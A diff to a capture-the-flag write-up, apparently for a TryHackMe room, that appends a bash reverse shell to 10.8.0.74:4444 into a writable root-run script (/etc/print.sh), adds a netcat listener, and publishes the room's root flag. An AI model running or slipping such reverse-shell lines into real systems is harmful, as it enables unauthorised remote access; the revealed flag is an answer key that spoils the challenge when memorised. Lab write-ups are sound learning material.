@@ -187,12 +187,24 @@ it also run a file with lennie permission
 
 ![image](https://user-images.githubusercontent.com/90561566/202415242-39b20879-3392-446a-a212-7e1e929e9b92.png)
 
-```
-echo "cp /root/* /home/lennie/*;chmod 777 /home/lennie/*" >> /etc/print.sh
+create a reverse shell
 
 ```
+echo "bash -i >& /dev/tcp/10.8.0.74/4444 0>&1" >> /etc/print.sh
+```
 
+open netcat and wait it back
+
+```
+nc -vlnp 4444
+```
+
+![image](https://user-images.githubusercontent.com/90561566/202850268-cc928bc4-fb11-435f-a407-c76efe9868d1.png)
+
+flag here
+
+![image](https://user-images.githubusercontent.com/90561566/202850291-a1f6999f-c1d5-4ad5-b59e-5b4e2b141c3e.png)
 
 | Flag | root.txt |
 | --- | --- |
-| Answer | <flag> |
+| Answer | THM{f963aaa6a430f210222158ae15c3d76d} |
